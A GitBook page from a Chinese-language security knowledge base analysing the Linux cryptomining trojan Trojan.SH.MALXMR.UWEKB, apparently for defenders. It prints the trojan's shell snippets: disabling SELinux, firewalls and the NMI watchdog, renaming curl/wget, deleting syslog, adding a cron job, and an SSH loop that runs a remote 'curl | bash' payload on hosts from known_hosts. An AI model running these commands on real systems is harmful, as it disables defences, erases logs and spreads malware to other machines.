@@ -1,0 +1,700 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Trojan.SH.MALXMR.UWEKB-分析 · WeLearn-安全知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-toggle-chapters/toggle.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-prism/prism.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-disqus/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../../环境搭建/" />
+    
+    
+    <link rel="prev" href="./" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../CTF/">
+            
+                <a href="../../CTF/">
+            
+                    
+                    CTF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../CTF/2017_0CTF_simplesqlin.html">
+            
+                <a href="../../CTF/2017_0CTF_simplesqlin.html">
+            
+                    
+                    2017 0 CTF Simplesqlin
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../CTF/dedecms-guess-admin-username-trick.html">
+            
+                <a href="../../CTF/dedecms-guess-admin-username-trick.html">
+            
+                    
+                    Dedecms Guess Admin Username Trick
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../Web安全/">
+            
+                <a href="../../Web安全/">
+            
+                    
+                    Web安全
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../Web安全/SQLi/">
+            
+                <a href="../../Web安全/SQLi/">
+            
+                    
+                    SQ Li
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" data-path="../../Web安全/SQLi/Mysql/">
+            
+                <a href="../../Web安全/SQLi/Mysql/">
+            
+                    
+                    Mysql
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.1" data-path="../../Web安全/SQLi/Mysql/为什么-backtick-能做注释符.html">
+            
+                <a href="../../Web安全/SQLi/Mysql/为什么-backtick-能做注释符.html">
+            
+                    
+                    为什么-backtick-能做注释符
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="../../Web安全/SQLi/通用问题/">
+            
+                <a href="../../Web安全/SQLi/通用问题/">
+            
+                    
+                    通用问题
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.2.1" data-path="../../Web安全/SQLi/通用问题/为什么感觉在实际的测试中ORDER_BY注入的比例变高了.html">
+            
+                <a href="../../Web安全/SQLi/通用问题/为什么感觉在实际的测试中ORDER_BY注入的比例变高了.html">
+            
+                    
+                    为什么感觉在实际的测试中ORDER_BY注入的比例变高了
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../Web安全/其他/">
+            
+                <a href="../../Web安全/其他/">
+            
+                    
+                    其他
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="../../Web安全/其他/DNS-Rebinding.html">
+            
+                <a href="../../Web安全/其他/DNS-Rebinding.html">
+            
+                    
+                    DNS Rebinding
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    主机安全
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    木马分析
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.4.1.1" data-path="Trojan.SH.MALXMR.UWEKB-分析.html">
+            
+                <a href="Trojan.SH.MALXMR.UWEKB-分析.html">
+            
+                    
+                    Trojan.SH.MALXMR.UWEKB-分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../环境搭建/">
+            
+                <a href="../../环境搭建/">
+            
+                    
+                    环境搭建
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../环境搭建/Ubuntu18使用Python连接Oracle数据库.html">
+            
+                <a href="../../环境搭建/Ubuntu18使用Python连接Oracle数据库.html">
+            
+                    
+                    Ubuntu18使用Python连接Oracle数据库
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../环境搭建/Ubuntu搭建DNS服务器.html">
+            
+                <a href="../../环境搭建/Ubuntu搭建DNS服务器.html">
+            
+                    
+                    Ubuntu搭建DNS服务器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../环境搭建/提权漏洞怎么测试-安装一些其他版本的内核.html">
+            
+                <a href="../../环境搭建/提权漏洞怎么测试-安装一些其他版本的内核.html">
+            
+                    
+                    提权漏洞怎么测试-安装一些其他版本的内核
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Trojan.SH.MALXMR.UWEKB-分析</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><li><span class="title-icon "></span><a href="#trojanshmalxmruwekb-&#x5206;&#x6790;"><b></b>Trojan.SH.MALXMR.UWEKB &#x5206;&#x6790;</a></li><ul><li><span class="title-icon "></span><a href="#&#x58F0;&#x660E;"><b></b>&#x58F0;&#x660E;</a></li><li><span class="title-icon "></span><a href="#&#x4E00;&#x3001;&#x6728;&#x9A6C;&#x4FE1;&#x606F;"><b></b>&#x4E00;&#x3001;&#x6728;&#x9A6C;&#x4FE1;&#x606F;</a></li><li><span class="title-icon "></span><a href="#&#x4E8C;&#x3001;&#x6728;&#x9A6C;&#x5206;&#x6790;"><b></b>&#x4E8C;&#x3001;&#x6728;&#x9A6C;&#x5206;&#x6790;</a></li></ul></ul></div><a href="#trojanshmalxmruwekb-&#x5206;&#x6790;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="trojanshmalxmruwekb-&#x5206;&#x6790;"><a name="trojanshmalxmruwekb-&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#trojanshmalxmruwekb-&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>Trojan.SH.MALXMR.UWEKB &#x5206;&#x6790;</h1>
+<p><strong><code>[&#x539F;&#x521B;]</code></strong></p>
+<h2 id="&#x58F0;&#x660E;"><a name="&#x58F0;&#x660E;" class="anchor-navigation-ex-anchor" href="#&#x58F0;&#x660E;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x58F0;&#x660E;</h2>
+<p>&#x672C;&#x6587;&#x4E3A;&#x7EAF;&#x6280;&#x672F;&#x5206;&#x6790;&#x6587;&#x7AE0;&#xFF0C;&#x610F;&#x5728;&#x4E3A;&#x5E7F;&#x5927;&#x5B89;&#x5168;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x8005;&#x5BF9;&#x6728;&#x9A6C;&#x57FA;&#x672C;&#x884C;&#x4E3A;&#x8FDB;&#x884C;&#x6392;&#x67E5;&#xFF0C;&#x5207;&#x4E0D;&#x53EF;&#x7528;&#x4F5C;&#x975E;&#x6CD5;&#x5DE5;&#x4F5C;&#x4F7F;&#x7528;&#x3002;&#x6587;&#x4E2D;&#x4EE3;&#x7801;&#x4E3A;&#x7247;&#x6BB5;&#x622A;&#x53D6;&#xFF0C;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x8FD0;&#x884C;&#x3002;&#x4EFB;&#x4F55;&#x7528;&#x4F5C;&#x975E;&#x6CD5;&#x7528;&#x9014;&#x4E0E;&#x672C;&#x4EBA;&#x65E0;&#x5173;&#x3002;</p>
+<h2 id="&#x4E00;&#x3001;&#x6728;&#x9A6C;&#x4FE1;&#x606F;"><a name="&#x4E00;&#x3001;&#x6728;&#x9A6C;&#x4FE1;&#x606F;" class="anchor-navigation-ex-anchor" href="#&#x4E00;&#x3001;&#x6728;&#x9A6C;&#x4FE1;&#x606F;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4E00;&#x3001;&#x6728;&#x9A6C;&#x4FE1;&#x606F;</h2>
+<p><a href="https://www.trendmicro.com/vinfo/hk/threat-encyclopedia/malware/Trojan.SH.MALXMR.UWEKB/" target="_blank">trendmicro</a></p>
+<p>&#x6B64;&#x6728;&#x9A6C;&#x529F;&#x80FD;&#x8F83;&#x4E3A;&#x9F50;&#x5168;&#xFF0C;&#x5305;&#x542B;&#x5173;&#x95ED;&#x673A;&#x5668;&#x9632;&#x62A4;&#x63AA;&#x65BD;&#xFF0C;&#x8BC6;&#x522B;&#x5E76;&#x5173;&#x95ED;&#x4E91;&#x9632;&#x62A4;&#x6A21;&#x5757;&#xFF08;&#x963F;&#x91CC;&#x4E91;&#x9632;&#x62A4;&#x6A21;&#x5757;&#xFF0C;&#x817E;&#x8BAF;&#x4E91;&#x955C;&#xFF09;&#xFF0C;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x7ADE;&#x54C1;&#x6728;&#x9A6C;&#x53CA;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;&#xFF0C;&#x5185;&#x7F51;&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#x7B49;&#x3002;</p>
+<h2 id="&#x4E8C;&#x3001;&#x6728;&#x9A6C;&#x5206;&#x6790;"><a name="&#x4E8C;&#x3001;&#x6728;&#x9A6C;&#x5206;&#x6790;" class="anchor-navigation-ex-anchor" href="#&#x4E8C;&#x3001;&#x6728;&#x9A6C;&#x5206;&#x6790;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4E8C;&#x3001;&#x6728;&#x9A6C;&#x5206;&#x6790;</h2>
+<ul>
+<li>&#x4E34;&#x65F6;&#x5173;&#x95ED; selinux &#x9632;&#x706B;&#x5899;&#xFF08;&#x91CD;&#x542F;&#x6062;&#x590D;&#xFF09;</li>
+</ul>
+<pre class="language-"><code class="lang-bash">setenforce <span class="token number">0</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>dev/null
+</code></pre>
+<ul>
+<li>&#x6C38;&#x4E45;&#x5173;&#x95ED; selinux &#x9632;&#x706B;&#x5899;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token builtin class-name">echo</span> <span class="token assign-left variable">SELINUX</span><span class="token operator">=</span>disabled <span class="token operator">&gt;</span> /etc/sysconfig/selinux <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
+</code></pre>
+<ul>
+<li>&#x5C06;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5237;&#x65B0;&#x5230;&#x78C1;&#x76D8;&#x5E76;&#x624B;&#x52A8;&#x91CA;&#x653E;&#x7F13;&#x5B58;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token function">sync</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token number">3</span> <span class="token operator">&gt;</span>/proc/sys/vm/drop_caches
+</code></pre>
+<p><em>Tips</em></p>
+<pre class="language-"><code class="lang-bash"><span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">&gt;</span>/proc/sys/vm/drop_caches      &#x91CA;&#x653E; pagecache
+<span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">&gt;</span>/proc/sys/vm/drop_caches      &#x91CA;&#x653E; pagecache, dentries and inodes
+<span class="token builtin class-name">echo</span> <span class="token number">3</span> <span class="token operator">&gt;</span>/proc/sys/vm/drop_caches      &#x91CA;&#x653E;&#x4E0A;&#x8FF0;&#x4E8C;&#x8005;
+</code></pre>
+<ul>
+<li>&#x521B;&#x5EFA; <code>/etc/svcupdates</code>&#xFF0C;&#x540E;&#x7EED;&#x636E;&#x6B64;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5177;&#x6709;root&#x6743;&#x9650;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">&gt;</span> /etc/svcupdates
+</code></pre>
+<ul>
+<li>&#x91CD;&#x547D;&#x540D; curl/wget&#xFF08;&#x514D;&#x6740;&#xFF09;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token function">mv</span> /usr/bin/curl /usr/bin/url
+<span class="token function">mv</span> /usr/bin/url /usr/bin/cd1
+<span class="token function">mv</span> /usr/bin/wget /usr/bin/get
+<span class="token function">mv</span> /usr/bin/get /usr/bin/wd1
+</code></pre>
+<ul>
+<li>&#x8BBE;&#x7F6E;&#x8FDB;&#x7A0B;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x53E5;&#x67C4;&#x6700;&#x5927;&#x9650;&#x5236;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token builtin class-name">ulimit</span> -n <span class="token number">65535</span>
+</code></pre>
+<ul>
+<li>&#x5220;&#x9664;syslog</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token function">rm</span> -rf /var/log/syslog
+</code></pre>
+<ul>
+<li>&#x4FEE;&#x6539; tmp&#x76EE;&#x5F55;&#x5C5E;&#x6027;</li>
+</ul>
+<pre class="language-"><code class="lang-bash">chattr -iua /tmp/
+chattr -iua /var/tmp/
+</code></pre>
+<p><em>Tips</em></p>
+<pre class="language-"><code class="lang-vim">a<span class="token punctuation">:</span> &#x53EA;&#x80FD;&#x6DFB;&#x52A0;
+i<span class="token punctuation">:</span> &#x4E0D;&#x53EF;&#x79FB;&#x52A8;
+<span class="token keyword">u</span><span class="token punctuation">:</span> &#x4E0D;&#x53EF;&#x5220;&#x9664;
+<span class="token operator">+</span><span class="token punctuation">:</span> &#x6DFB;&#x52A0;&#x5C5E;&#x6027;   <span class="token operator">-</span><span class="token punctuation">:</span> &#x5220;&#x9664;&#x5C5E;&#x6027;
+</code></pre>
+<ul>
+<li>&#x5173;&#x95ED;ufw</li>
+</ul>
+<pre class="language-"><code class="lang-bash">ufw disable
+</code></pre>
+<ul>
+<li>&#x5173;&#x95ED;iptables</li>
+</ul>
+<pre class="language-"><code class="lang-bash">iptables -F
+</code></pre>
+<ul>
+<li>&#x5173;&#x95ED; nmi watchdog</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token builtin class-name">echo</span> <span class="token string">&apos;0&apos;</span> <span class="token operator">&gt;</span>/proc/sys/kernel/nmi_watchdog
+<span class="token builtin class-name">echo</span> <span class="token string">&apos;kernel.nmi_watchdog=0&apos;</span> <span class="token operator">&gt;&gt;</span>/etc/sysctl.conf
+</code></pre>
+<p><em>Tips</em></p>
+<pre class="language-"><code class="lang-bash">nmi watchdog: &#x76D1;&#x6D4B;&#x5185;&#x6838;&#x4E2D;&#x65AD;&#x5E76;&#x6267;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#x91CD;&#x542F;
+</code></pre>
+<ul>
+<li>&#x5220;&#x9664;&#x7ADE;&#x54C1;&#x6728;&#x9A6C;&#x53CA;&#x6316;&#x77FF;&#x6587;&#x4EF6;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token function">userdel</span> akay
+<span class="token function">userdel</span> vfinder
+<span class="token function">rm</span> -rf /tmp/addres*
+<span class="token function">rm</span> -rf /tmp/walle*
+<span class="token function">rm</span> -rf /tmp/keys
+</code></pre>
+<ul>
+<li>&#x5220;&#x9664;&#x4E91;&#x9632;&#x62A4;&#x4EA7;&#x54C1;&#xFF08;&#x963F;&#x91CC;&#x4E91;&#x9632;&#x62A4;&#xFF0C;&#x817E;&#x8BAF;&#x4E91;&#x955C;&#xFF09;</li>
+<li>&#x5220;&#x9664;&#x7ADE;&#x54C1;&#x6728;&#x9A6C;&#x53CA;&#x6316;&#x77FF;&#x7A0B;&#x5E8F;</li>
+<li>&#x5982;&#x679C;&#x5F53;&#x524D;&#x6743;&#x9650;&#x662F;root&#xFF0C;&#x5219;&#x5728;/etc&#x76EE;&#x5F55;&#x6267;&#x884C;&#x6728;&#x9A6C;&#x53CA;&#x6316;&#x77FF;&#xFF0C;&#x5426;&#x5219;&#x5728;/tmp&#x76EE;&#x5F55;&#x8FDB;&#x884C;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> -f <span class="token string">&quot;<span class="token variable">$rtdir</span>&quot;</span> <span class="token punctuation">]</span>
+</code></pre>
+<ul>
+<li>&#x6728;&#x9A6C;&#x8FD0;&#x884C;&#x52A0;&#x5165;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;</li>
+</ul>
+<pre class="language-"><code class="lang-bash">unlock_cron
+<span class="token builtin class-name">echo</span> <span class="token string">&quot;*/30 * * * * sh /etc/newsvc.sh &gt;/dev/null 2&gt;&amp;1&quot;</span> <span class="token operator">&gt;&gt;</span> <span class="token variable">${crondir}</span>
+lock_cron
+</code></pre>
+<ul>
+<li>&#x5185;&#x7F51;&#x6A2A;&#x79FB;</li>
+</ul>
+<pre class="language-"><code class="lang-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> -f /root/.ssh/known_hosts <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -f /root/.ssh/id_rsa.pub <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token keyword">for</span> <span class="token for-or-select variable">h</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> -oE <span class="token string">&quot;<span class="token entity" title="\b">\b</span>([0-9]{1,3}\.){3}[0-9]{1,3}<span class="token entity" title="\b">\b</span>&quot;</span> /root/.ssh/known_hosts<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">ssh</span> -oBatchMode<span class="token operator">=</span>yes -oConnectTimeout<span class="token operator">=</span><span class="token number">5</span> -oStrictHostKeyChecking<span class="token operator">=</span>no <span class="token variable">$h</span> <span class="token string">&apos;curl -o-  http://*.*.*.*/b2f628fff19fda999999999/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&apos;</span> <span class="token operator">&amp;</span> <span class="token keyword">done</span>
+<span class="token keyword">fi</span>
+</code></pre>
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; 2022 WeLearn. All rights reserved. all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x7AE0;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x4E8E;
+2022-04-09 18:45:35
+</span></footer>
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: 木马分析">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../../环境搭建/" class="navigation navigation-next " aria-label="Next page: 环境搭建">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Trojan.SH.MALXMR.UWEKB-分析","level":"1.4.1.1","depth":3,"next":{"title":"环境搭建","level":"1.5","depth":1,"path":"环境搭建/README.md","ref":"环境搭建/README.md","articles":[{"title":"Ubuntu18使用Python连接Oracle数据库","level":"1.5.1","depth":2,"path":"环境搭建/Ubuntu18使用Python连接Oracle数据库.md","ref":"环境搭建/Ubuntu18使用Python连接Oracle数据库.md","articles":[]},{"title":"Ubuntu搭建DNS服务器","level":"1.5.2","depth":2,"path":"环境搭建/Ubuntu搭建DNS服务器.md","ref":"环境搭建/Ubuntu搭建DNS服务器.md","articles":[]},{"title":"提权漏洞怎么测试-安装一些其他版本的内核","level":"1.5.3","depth":2,"path":"环境搭建/提权漏洞怎么测试-安装一些其他版本的内核.md","ref":"环境搭建/提权漏洞怎么测试-安装一些其他版本的内核.md","articles":[]}]},"previous":{"title":"木马分析","level":"1.4.1","depth":2,"path":"主机安全/木马分析/README.md","ref":"主机安全/木马分析/README.md","articles":[{"title":"Trojan.SH.MALXMR.UWEKB-分析","level":"1.4.1.1","depth":3,"path":"主机安全/木马分析/Trojan.SH.MALXMR.UWEKB-分析.md","ref":"主机安全/木马分析/Trojan.SH.MALXMR.UWEKB-分析.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["chapter-fold","toggle-chapters","theme-comscore","prism","-highlight","code","ancre-navigation","-lunr","-search","search-pro","splitter","popup","pageview-count","tbfed-pagefooter","disqus","baidu-tongji-with-multiple-channel","sitemap-general","github"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © 2022 WeLearn. All rights reserved.","modify_label":"文章最后修改于","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{},"disqus":{"useIdentifier":false,"shortName":"welearn-1"},"github":{"url":"https://github.com/ohnonoyesyes"},"baidu-tongji-with-multiple-channel":{"multipleChannelConfig":{},"url":"https://hm.baidu.com/hm.js","token":"7b1c79401a455438ec247687904dce49"},"splitter":{},"search-pro":{},"popup":{},"code":{"copyButtons":true},"sitemap-general":{"prefix":"https://welearn.tencent.black"},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"toggle-chapters":{}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"WeLearn-安全知识库","gitbook":"*","theme-default":{"showLevel":true}},"file":{"path":"主机安全/木马分析/Trojan.SH.MALXMR.UWEKB-分析.md","mtime":"2022-04-09T10:45:35.120Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-04-09T12:18:54.505Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-toggle-chapters/toggle.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/URI.js/1.16.1/URI.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-disqus/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-baidu-tongji-with-multiple-channel/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
